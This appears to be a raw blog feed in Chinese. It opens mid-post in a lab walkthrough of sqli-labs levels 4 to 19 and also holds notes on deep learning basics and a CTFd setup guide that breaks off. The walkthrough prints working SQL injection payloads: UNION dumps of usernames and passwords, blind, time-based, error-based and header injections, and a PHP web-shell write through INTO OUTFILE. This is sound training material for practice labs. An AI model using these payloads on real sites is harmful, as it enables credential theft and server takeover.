data-srcset="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" srcset="data:image/png;base64,666" alt="Ga97r5.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3–+</em></strong></p><hr><ul><li><p>往下步骤与上述题目相同</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" srcset="data:image/png;base64,666" alt="Ga96lm.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p>回显报错数据，尝试盲注</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetUSz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetUSz.png" srcset="data:image/png;base64,666" alt="GetUSz.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+</a></p><hr><ul><li><p>对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果</p><p><img src="https://www.helloimg.com/images/2021/12/05/Get68n.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/Get68n.png" srcset="data:image/png;base64,666" alt="Get68n.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li><p>改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetKoR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetKoR.png" srcset="data:image/png;base64,666" alt="GetKoR.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+</a></p><hr><ul><li>列名以此类推</li></ul><p>可以用python写个脚本来跑，或者使用burpsuite</p><p>另外，还可以使用updataxml()函数来获取相关信息</p><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" srcset="data:image/png;base64,666" alt="Gi3aM0.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+</a></p><hr><h2 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h2><p>与上一道题类似，将单引号换为双引号</p><hr><h2 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h2><ul><li>利用永真永假的条件配合and和or判断参数id的闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi318m.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi318m.png" srcset="data:image/png;base64,666" alt="Gi318m.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+</a></p><hr><ul><li>利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" srcset="data:image/png;base64,666" alt="Gi3PX5.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;</a>)) union select 1,’2’,”<?php @eval($_POST['hahaha'];)?>“ into outfile “./“ –+</p><p>由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断</p><hr><h2 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h2><ul><li>判断参数闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" srcset="data:image/png;base64,666" alt="GiXeU9.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+</a></p><hr><ul><li>由于注入错误时不回显，因此可以使用上述的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXEng.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXEng.png" srcset="data:image/png;base64,666" alt="GiXEng.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li>往后步骤与上述盲注步骤一致</li></ul><hr><h2 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h2><ul><li>在判断参数闭合方式时，发现回显不改变</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" srcset="data:image/png;base64,666" alt="GiX3qE.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+</a></p><hr><ul><li>尝试基于时间的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" srcset="data:image/png;base64,666" alt="GiXxPX.png"></p><p>可以看到网页根据设定的时间正在加载，说明注入成功</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+</a></p><hr><ul><li>接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"></p><p>payload取上述盲注payload的查询部分</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+</a></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><ul><li>将闭合参数的单引号替换为双引号，其余一致</li></ul><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意</p><ul><li>不可以直接将url编码之后的数据（如%20）直接提交</li><li>最后的注释不可以用“–+”，而应该用“#”</li></ul><p><img src="https://www.helloimg.com/images/2021/12/19/GvklDS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvklDS.png" srcset="data:image/png;base64,666" alt="GvklDS.png"></p><p>上面这样注释是行不通的，用“#”代替“–+”之后如下图</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkHao.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkHao.png" srcset="data:image/png;base64,666" alt="GvkHao.png"></p><p>然后再用之前写过的题当中出现的联合注入</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" srcset="data:image/png;base64,666" alt="Gvkigb.png"></p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" srcset="data:image/png;base64,666" alt="GvkbHD.png"></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>原理同上一题一致，唯一差别是闭合方式不同</p><p><a href="https://www.helloimg.com/image/GvraLC"><img src="https://www.helloimg.com/images/2021/12/19/GvraLC.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvraLC.png" srcset="data:image/png;base64,666" alt="GvraLC.png"></a></p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" srcset="data:image/png;base64,666" alt="Gvr1NQ.png"></p><hr><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分</p><p>下图是联合注入后无回显的结果</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" srcset="data:image/png;base64,666" alt="Gvhw7o.png"></p><hr><p>这里使用了报错注入返回了mysql的绝对路径</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" srcset="data:image/png;base64,666" alt="GvhNBD.png"></p><hr><p>这里查询到了当前的数据库</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" srcset="data:image/png;base64,666" alt="Gvhvnb.png"></p><hr><p>需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" srcset="data:image/png;base64,666" alt="GvhdFK.png"></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>这道题与上一道题类似，唯一不同的仍是闭合方式不同</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这道题考察的是post方式的基于时间的盲注</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" srcset="data:image/png;base64,666" alt="GQtNsK.png"></p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" srcset="data:image/png;base64,666" alt="GQtvzT.png"></p><p>一开始依然先判断闭合方式</p><hr><p>然后用if语句构造基于时间的盲注</p><p>这里无需关注是否登录成功，只需关注响应时间</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" srcset="data:image/png;base64,666" alt="GQtQvb.png"></p><hr><p>然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入</p><p><strong>payload</strong>：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) #</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" srcset="data:image/png;base64,666" alt="GQt0B1.png"></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>这道题与上一道题目差不多，唯一区别仍是闭合方式不同</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入</p><p>这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" srcset="data:image/png;base64,666" alt="GQAE1g.png"></p><hr><p>往下的过程涉及到<strong>子查询</strong>的概念，即以查询的结果作为下一次查询的范围</p><p>查数据库</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" srcset="data:image/png;base64,666" alt="GQAm6P.png"></p><hr><p>往后只需将select database()替换为先前题目中相应的payload即可</p><p><a href="https://www.helloimg.com/image/GQALuz"><img src="https://www.helloimg.com/images/2021/12/25/GQALuz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQALuz.png" srcset="data:image/png;base64,666" alt="GQALuz.png"></a></p><hr><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行）</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPBct.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPBct.png" srcset="data:image/png;base64,666" alt="GzPBct.png"></p><p>再经过对username和password的多次注入后发现没有什么效果，尝试登录</p><hr><p><img src="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" srcset="data:image/png;base64,666" alt="GzPR3v.png"></p><p>可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPZME.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPZME.png" srcset="data:image/png;base64,666" alt="GzPZME.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPCru.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPCru.png" srcset="data:image/png;base64,666" alt="GzPCru.png"></p><p><strong>payload</strong>：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>这道题与上一道差不多，只不过修改的是Referer字段</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" srcset="data:image/png;base64,666" alt="GzPJXR.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" srcset="data:image/png;base64,666" alt="GzPxVn.png"></p><p><strong>payload</strong>：与上一道题一致</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf、web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 2</title>
      <link href="2021/11/29/deep_learning_from_scratch_2/"/>
      <url>2021/11/29/deep_learning_from_scratch_2/</url>
      
        <content type="html"><![CDATA[<h2 id="在”手写数字识别”中"><a href="#在”手写数字识别”中" class="headerlink" title="在”手写数字识别”中"></a>在”手写数字识别”中</h2><a id="more"></a><ul><li><p>了解到了mnist数据集</p></li><li><p>对运算过程中运算的具体对象有点问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">sys.path.append(os.pardir)</span><br><span class="line"><span class="keyword">from</span> dataset.mnist <span class="keyword">import</span> load_mnist</span><br><span class="line"></span><br><span class="line">(x_train, t_train), (x_test, t_test) = load_mnist(flatten=<span class="literal">True</span>, normalize=<span class="literal">False</span>) <span class="comment">#一开始不知道这是什么意思</span></span><br><span class="line"></span><br><span class="line">print(x_train.shape)</span><br><span class="line">print(t_train.shape)</span><br><span class="line">print(x_test.shape)</span><br><span class="line">print(t_test.shape)</span><br></pre></td></tr></table></figure></li></ul><p>对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了</p><p>x_train 是训练用的图像数据</p><p>t_train 是训练图像的解，即每个图像对应的数字</p><p>x_test 是用于测试的图像数据</p><p>t_test 是测试图像的解，即每个图像对应的数字</p><ul><li><p>认识了正规化、预处理和 one-hot 表示法</p><p>正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算</p><p>预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等</p><p>one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y = predict(network, x[i])</span><br><span class="line">    p= np.argmax(y) <span class="comment"># 获取概率最高的元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> p == t[i]:</span><br><span class="line">        accuracy_cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><p>另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系</p><p>输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小</p><p>输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十</p></li></ul><h2 id="在“从数据中学习”中"><a href="#在“从数据中学习”中" class="headerlink" title="在“从数据中学习”中"></a>在“从数据中学习”中</h2><ul><li><p>认识了许多概念</p><h3 id="特征量"><a href="#特征量" class="headerlink" title="特征量"></a>特征量</h3></li></ul><blockquote><p>特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式</p></blockquote><p>特征量是由人设计的</p><p>不同问题对应不同特征量</p><p>深度学习中特征量是由机器来学习的</p><h3 id="泛化能力"><a href="#泛化能力" class="headerlink" title="泛化能力"></a>泛化能力</h3><blockquote><p>泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力</p></blockquote><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只对某个数据集过度拟合的状态称为过拟合</p></blockquote><p>可以理解为训练的模型只对某个数据集起作用</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><blockquote><p>损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致</p></blockquote><h3 id="均方误差"><a href="#均方误差" class="headerlink" title="均方误差"></a>均方误差</h3><p>$$<br>E=\frac{1}{2}\Sigma_k(y_k-t_k)^2<br>$$</p><p>这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数</p><h3 id="交叉熵误差"><a href="#交叉熵误差" class="headerlink" title="交叉熵误差"></a>交叉熵误差</h3><p>$$<br>E=-\Sigma_kt_k\log{y_k}<br>$$</p><h3 id="损失函数的意义"><a href="#损失函数的意义" class="headerlink" title="损失函数的意义"></a>损失函数的意义</h3><p>个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果</p><h3 id="数值微分"><a href="#数值微分" class="headerlink" title="数值微分"></a>数值微分</h3><blockquote><p>利用某个给定的微小值的差分求导数的过程，称为数值微分</p></blockquote><ul><li><p>导数与偏导数的定义</p></li><li><p>梯度及梯度法</p><blockquote><p><strong>梯度法</strong>：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值</p></blockquote></li></ul><h3 id="学习算法（随机梯度下降法）的实现"><a href="#学习算法（随机梯度下降法）的实现" class="headerlink" title="学习算法（随机梯度下降法）的实现"></a>学习算法（随机梯度下降法）的实现</h3><p>神经网络的学习步骤：</p><ul><li><p>前提</p><p>神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习”</p></li><li><p>步骤1（mini-batch）</p><p>从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值</p></li><li><p>步骤2（计算梯度）</p><p>为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向</p></li><li><p>步骤3（更新参数）</p><p>将权重参数沿梯度方向进行微小更新</p></li><li><p>步骤4（重复）</p><p>重复步骤1、步骤2、步骤3</p></li></ul><blockquote><p><strong>epoch</strong>： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数</p></blockquote><h2 id="误差方向传播法"><a href="#误差方向传播法" class="headerlink" title="误差方向传播法"></a>误差方向传播法</h2><h3 id="计算图"><a href="#计算图" class="headerlink" title="计算图"></a>计算图</h3><p>了解正向传播、反向传播及局部计算的定义</p><h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><p>复合函数导数的定义</p><blockquote><p>如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示</p></blockquote><p>链式法则是关于复合函数的导数的性质</p><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><p>反向传播的计算顺序</p><blockquote><p>先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点</p></blockquote><ul><li>加法节点的反向传播</li></ul><p>加法节点的反向传播只乘以1</p><ul><li>乘法节点的反向传播</li></ul><p>乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游</p><p>对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd搭建</title>
      <link href="2021/11/28/ctf_contest_platform_build/"/>
      <url>2021/11/28/ctf_contest_platform_build/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF比赛平台搭建"><a href="#CTF比赛平台搭建" class="headerlink" title="CTF比赛平台搭建"></a>CTF比赛平台搭建</h1><a id="more"></a><h2 id="克隆CTFd"><a href="#克隆CTFd" class="headerlink" title="克隆CTFd"></a>克隆CTFd</h2><p>GitHub：<a href="https://github.com/CTFd/CTFd">https://github.com/CTFd/CTFd</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git                                                128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;CTFd&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 14012, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (869/869), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (555/555), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143</span><br><span class="line">Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (8691/8691), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo apt install docker docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker --version</span><br><span class="line">Docker version 20.10.8+dfsg1, build 3967b7d</span><br><span class="line">                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker-compose --version</span><br><span class="line">docker-compose version 1.27.4, build unknown</span><br></pre></td></tr></table></figure><h2 id="添加执行权限"><a href="#添加执行权限" class="headerlink" title="添加执行权限"></a>添加执行权限</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="在CTFd根目录下启动docker"><a href="#在CTFd根目录下启动docker" class="headerlink" title="在CTFd根目录下启动docker"></a>在CTFd根目录下启动docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo docker-compose up -d                                                                      130 ⨯</span><br><span class="line">Creating network <span class="string">&quot;ctfd_internal&quot;</span> with the default driver</span><br><span class="line">Creating network <span class="string">&quot;ctfd_default&quot;</span> with the default driver</span><br><span class="line">Pulling db (mariadb:10.4.12)...</span><br><span class="line">10.4.12: Pulling from library/mariadb</span><br><span class="line">23884877105a: Pull complete</span><br><span class="line">bc38caa0f5b9: Pull complete</span><br><span class="line">2910811b6c42: Pull complete</span><br><span class="line">36505266dcc6: Pull complete</span><br><span class="line">e69dcc78e96e: Pull complete</span><br><span class="line">222f44c5392d: Pull complete</span><br><span class="line">efc64ea97b9c: Pull complete</span><br><span class="line">9912a149de6b: Pull complete</span><br><span class="line">7ef6cf5b5697: 